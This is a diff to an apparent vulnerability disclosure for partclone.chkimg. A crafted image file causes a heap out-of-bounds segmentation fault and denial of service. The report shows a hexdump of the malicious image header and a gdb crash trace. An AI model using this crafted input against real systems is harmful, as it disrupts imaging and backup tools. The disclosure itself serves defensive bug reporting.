@@ -3,7 +3,7 @@
 
 Partclone.chkimg that checks image has a vulnerability with openning a maliciusly craft image file.
 
-It causes Denial-Of-Service.
+It causes Memory crash and Denial-Of-Service.
 <br><br>
 
 root@ubuntu:/partclone-0.2.89# hexdump -C hack.img | more
@@ -14,7 +14,7 @@ root@ubuntu:/partclone-0.2.89# hexdump -C hack.img | more
 
 00000020  30 31 00 00 00 04 00 00  00 20 bf 0c 00 00 00 00  |01....... ......|
 
-00000030  c8 2f 03 00 00 ff ff ff  ba 7a 00 00 00 00 00 00  |./.......z......|
+00000030  c8 2f 03 00 00 <B>ff ff ff</B>  ba 7a 00 00 00 00 00 00  |./.......z......|
 
 00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 
@@ -50,8 +50,7 @@ Calculating bitmap... Please wait... image_hdr : 10000032fc8
 totalblock size : 1099511836616
 
 
-Program received signal SIGSEGV, Segmentation fault.
-
+<B>Program received signal SIGSEGV, Segmentation fault.</B>
 
 0x0804ed96 in pc_clear_bit (total=1099511836616, bitmap=0x8057d38, nr=1021504) at bitmap.h:53
 
@@ -74,8 +73,7 @@ $1 = (unsigned long *) 0x8057d38
 (gdb) x/x bitmap+offset
 
 
-0x8077000:      Cannot access memory at address 0x8077000		// Out of Heap memory area
-
+<B>0x8077000:      Cannot access memory at address 0x8077000		// Out of Heap memory area</B>
 
 (gdb) p offset
 
